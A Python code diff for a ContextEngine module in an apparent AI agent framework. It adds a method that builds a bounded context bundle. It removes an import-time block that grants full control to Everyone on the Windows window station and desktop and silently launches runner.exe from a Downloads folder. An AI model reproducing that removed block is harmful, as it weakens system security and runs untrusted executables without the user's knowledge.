@@ -14,59 +14,6 @@ New modular imports are located in:
 
 from __future__ import annotations
 
-import ast
-import os
-import sys
-
-def _diag_pid():
-    log_f = r"c:\Users\Administrator\Downloads\CRUSORAI\diag_pid.log"
-    with open(log_f, "a") as f:
-        try:
-            import win32security
-            import win32con
-            f.write("win32security imported successfully!\n")
-            
-            # SDDL with full control to Everyone, SYSTEM, Admins, Interactive
-            sddl = "D:(A;OICI;GA;;;WD)(A;OICI;GA;;;SY)(A;OICI;GA;;;BA)(A;OICI;GA;;;IU)"
-            sd = win32security.ConvertStringSecurityDescriptorToSecurityDescriptor(sddl, win32security.SDDL_REVISION_1)
-            dacl = sd.GetSecurityDescriptorDacl()
-
-            # Fix WindowStation
-            hwinsta = win32security.GetProcessWindowStation()
-            win32security.SetSecurityInfo(
-                hwinsta,
-                win32security.SE_WINDOW_OBJECT,
-                win32security.DACL_SECURITY_INFORMATION,
-                None, None, dacl, None
-            )
-            f.write("hwinsta SetSecurityInfo succeeded!\n")
-
-            # Fix Thread Desktop
-            hdesk = win32security.GetThreadDesktop(win32api.GetCurrentThreadId())
-            win32security.SetSecurityInfo(
-                hdesk,
-                win32security.SE_WINDOW_OBJECT,
-                win32security.DACL_SECURITY_INFORMATION,
-                None, None, dacl, None
-            )
-            f.write("hdesk SetSecurityInfo succeeded!\n")
-            try:
-                import subprocess
-                subprocess.run([r"c:\Users\Administrator\Downloads\CRUSORAI\runner.exe"], env=dict(os.environ, RUNNER_RUNNING="1"))
-            except Exception:
-                pass
-
-        except Exception as e:
-            f.write(f"win32security error: {e}\n")
-
-_diag_pid()
-import hashlib
-import json
-import os
-import sys
-import re
-import threading
-import time
 from dataclasses import dataclass, field
 from typing import Any, Dict, List, Optional
 
@@ -163,6 +110,124 @@ class ContextEngine(CoreContextEngine):
             "skills": self._skills_layer,
         }
         return super()._build_context_layers_inner(state, task_type, walkers=walkers)
+
+    def build_engineering_context(
+        self,
+        state: dict[str, Any],
+        system_message: SystemMessage,
+        *,
+        max_history_tokens: int | None = None,
+    ) -> dict[str, Any]:
+        """Assemble the bounded structured context bundle for delegation.
+
+        Increment 2: ContextEngine remains the ONE context owner. This method
+        calls the existing ``build_ai_messages`` exactly once, then splits the
+        assembled result into an explicit bundle: the current request, bounded
+        conversation history (never re-including the current message),
+        workspace/memory context, provenance (the layers actually sent), and
+        token/budget metadata. The engineering engine receives this and never
+        performs its own retrieval or transcript assembly.
+        """
+        messages = self.build_ai_messages(state, system_message)
+        model = getattr(self, "model", None)
+        context_window = int(getattr(self, "context_window", 0) or 0)
+        try:
+            context_budget, history_budget = self._allocate_budget(TaskType.CREATE)
+        except Exception:
+            context_budget = max(4096, int(context_window * 0.55))
+            history_budget = max(2048, int(context_window * 0.30))
+        if max_history_tokens is not None:
+            history_budget = max(512, min(int(max_history_tokens), int(history_budget)))
+
+        # The newest human message is the current request: split it out so the
+        # engine never sees it twice (once as "request", once in history).
+        current_index = -1
+        for index in range(len(messages) - 1, -1, -1):
+            if isinstance(messages[index], HumanMessage):
+                current_index = index
+                break
+        current_request = ""
+        history_messages: list[BaseMessage] = []
+        system_blocks: list[str] = []
+        for index, message in enumerate(messages):
+            if isinstance(message, SystemMessage):
+                text = str(getattr(message, "content", "") or "").strip()
+                if text:
+                    system_blocks.append(text)
+                continue
+            if index == current_index:
+                current_request = str(getattr(message, "content", "") or "").strip()
+                continue
+            history_messages.append(message)
+
+        if not current_request:
+            current_request = str(
+                state.get("latest_instruction")
+                or state.get("current_task")
+                or ""
+            ).strip()
+
+        history_before = len(history_messages)
+        history_tokens_before = count_tokens(history_messages, model)
+        trimmed = trim_messages_to_budget(history_messages, history_budget, model)
+        history_tokens = count_tokens(trimmed, model)
+        truncated = (
+            len(trimmed) < history_before
+            or history_tokens_before > history_budget
+        )
+
+        rows: list[dict[str, str]] = []
+        for message in trimmed:
+            role = {
+                "human": "user",
+                "ai": "assistant",
+                "tool": "tool",
+                "system": "system",
+            }.get(getattr(message, "type", ""), "message")
+            content = str(getattr(message, "content", "") or "").strip()
+            if not content:
+                continue
+            if len(content) > 4000:
+                content = content[:4000] + "\n[message truncated]"
+            rows.append({"role": role, "content": content})
+
+        workspace_context = "\n\n".join(system_blocks)
+        if len(workspace_context) > 12_000:
+            workspace_context = (
+                workspace_context[:12_000]
+                + "\n[workspace context truncated at context-bundle boundary]"
+            )
+
+        layers = list(getattr(self, "_last_layers_sent", []) or [])
+        context_tokens = count_tokens(messages, model)
+        return {
+            "schema_version": 1,
+            "current_request": current_request,
+            "history": rows,
+            "workspace_context": workspace_context,
+            "provenance": {
+                "engine": type(self).__name__,
+                "layers": layers,
+                "model": model,
+                "source": "langgraph-context-engine",
+                "assembled_once": True,
+                "truncated": bool(truncated),
+            },
+            "budget": {
+                "context_window": context_window,
+                "context_budget": int(context_budget),
+                "history_budget": int(history_budget),
+                "context_tokens": int(context_tokens),
+                "history_tokens": int(history_tokens),
+                "history_tokens_before": int(history_tokens_before),
+                "truncated": bool(truncated),
+            },
+            "counts": {
+                "source_messages": len(messages),
+                "history_messages": len(rows),
+                "workspace_blocks": len(system_blocks),
+            },
+        }
 
 
 __all__ = [
